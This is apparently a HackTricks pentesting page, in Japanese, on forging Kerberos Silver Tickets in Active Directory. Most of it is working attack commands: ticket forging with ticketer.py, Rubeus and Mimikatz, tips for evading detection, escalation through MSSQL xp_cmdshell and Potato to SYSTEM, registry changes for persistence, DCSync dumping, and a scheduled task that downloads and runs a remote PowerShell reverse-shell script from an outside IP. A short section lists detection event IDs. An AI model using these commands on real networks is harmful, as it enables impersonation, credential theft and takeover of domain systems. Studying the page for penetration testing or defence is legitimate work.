# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** attack は、Active Directory (AD) 環境における service ticket の悪用を伴います。この手法では、computer account などの **service account の NTLM hash を取得**し、それを使って Ticket Granting Service (TGS) ticket を偽造します。この偽造した ticket により、攻撃者はネットワーク上の特定の service にアクセスし、**任意の user になりすます**ことができます。通常は administrative privileges の取得が目的です。ticket の偽造には AES keys を使用する方が、より安全で検出されにくい点が強調されています。<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets は、krbtgt account ではなく **service account の hash** だけを必要とするため、Golden Tickets より検出されにくくなります。ただし、対象とする特定の service に限定されます。さらに、user の password を盗むだけでも同様です。
さらに、**SPN が設定された account の password を侵害**した場合、その password を使って、その service に対して任意の user になりすます Silver Ticket を作成できます。

### Modern Kerberos changes (AES-only domains)

- **2022 年 11 月 8 日 (KB5021131)** 以降の Windows updates では、可能な場合に service ticket の **AES session keys** がデフォルトで使用され、RC4 は段階的に廃止されています。DC では **2026 年半ばまでに RC4 がデフォルトで無効化**される予定であるため、Silver Ticket に NTLM/RC4 hashes を依存すると、`KRB_AP_ERR_MODIFIED` により失敗するケースが増えます。対象の service account から常に **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) を抽出してください。<sup>[[5]](#references)</sup>
- service account の `msDS-SupportedEncryptionTypes` が AES に制限されている場合、`/aes256` または `-aesKey` を使用して forge する必要があります。NTLM hash を保有していても、RC4 (`/rc4` または `-nthash`) は機能しません。<sup>[[6]](#references)</sup>
- gMSA/computer accounts は 30 日ごとに rotate されます。forge する前に、LSASS、Secretsdump/NTDS、または DCsync から **current AES key** を dump してください。
- OPSEC: tools のデフォルトの ticket lifetime は、多くの場合 **10 年**です。異常な lifetime による検出を避けるため、現実的な期間（例: `-duration 600` minutes）を設定してください。<sup>[[6]](#references)</sup>

ticket crafting には、operating system に応じて異なる tools が使用されます。

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows上では
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS serviceは被害者のファイルシステムへアクセスするための一般的なターゲットとして注目されますが、HOSTやRPCSSなどの他のserviceも、taskやWMI queryに悪用できます。

### 例: MSSQL service (MSSQLSvc) + PotatoでSYSTEM

SQL service account（例: sqlsvc）のNTLM hash（またはAES key）を持っている場合、MSSQL SPN用のTGSをforgeし、任意のuserをSQL serviceにimpersonateできます。そこから、xp_cmdshellを有効化してSQL service accountとしてcommandを実行します。そのtokenにSeImpersonatePrivilegeがある場合、PotatoをchainしてSYSTEMへ権限昇格できます。<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 結果として得られたコンテキストに SeImpersonatePrivilege がある場合（service accounts ではよくある）、Potato variant を使用して SYSTEM を取得します：
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQLのabusingとxp_cmdshellの有効化についての詳細:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniquesの概要:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 利用可能なServices

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OSによっては以下も:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては、単に次を要求できます: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus**を使用すると、次のparameterですべてのticketを**ask for all**できます:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **同じclient/serviceについて、DC上に先行する4768/4769が存在しない**ことは、偽造されたTGSがserviceに直接提示されたことを示す一般的なindicatorです。
- 異常に長いticket lifetimeや、想定外のencryption type（domainがAESを強制しているのにRC4）も、4769/4624 data上で目立ちます。

## Persistence

マシンが30日ごとにpasswordをrotateするのを防ぐには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`を設定します。または、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`を30daysより大きい値に設定し、マシンのpasswordをrotateするrotation perdiodを指定することもできます。<sup>[[3]](#references)</sup>

## Service ticketsのabusing

以下の例では、administrator accountをimpersonateしてticketを取得したとします。

### CIFS

このticketを使用すると、**SMB**経由で`C$`および`ADMIN$` folder（exposeされている場合）にaccessし、次のように簡単な操作でremote filesystemの一部にfilesをcopyできます:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
この権限があれば、host 内で shell を取得したり、**psexec** を使用して任意のコマンドを実行したりできます:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

この権限があれば、リモートコンピューター上に scheduled task を作成し、任意のコマンドを実行できます:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

これらのチケットを使用すると、**被害者システム上で WMI を実行できます**：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
以下のページで **wmiexec に関する詳細情報**を確認してください。


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

コンピューターへの winrm access があれば、**そのコンピューターに access**し、さらに PowerShell を取得できます。
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
リモートホストに **winrm** を使用して接続する **その他の方法**については、次のページを確認してください。


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> リモートコンピューター上で **winrm** が有効化され、listen 状態である必要があります。

### LDAP

この権限を使用すると、**DCSync** によって DC データベースを dump できます:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSyncについて詳しく学ぶ**には、以下のページを参照してください:


{{#ref}}
dcsync.md
{{#endref}}


## 参考資料

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): How to attack Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
